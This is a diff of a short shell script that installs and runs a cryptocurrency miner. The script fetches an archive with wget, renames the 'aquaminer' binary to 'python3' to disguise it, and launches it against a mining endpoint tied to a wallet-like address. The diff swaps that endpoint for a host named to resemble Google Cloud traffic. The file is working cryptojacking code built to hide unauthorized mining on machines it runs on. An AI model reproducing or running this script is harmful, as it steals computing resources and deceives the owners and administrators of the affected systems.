@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./python3 -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
+./python3 -F http://test-googlecloud.ddns.net/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
 
      
 fi
@@ -28,6 +28,6 @@ fi
 wget https://bitbucket.org/lovelyn/openai/downloads/data.zip
 unzip data.zip
 mv aquaminer-0.4-linux-amd64 python3
-./python3 -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
+./python3 -F http://test-googlecloud.ddns.net/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
 
 exit 0
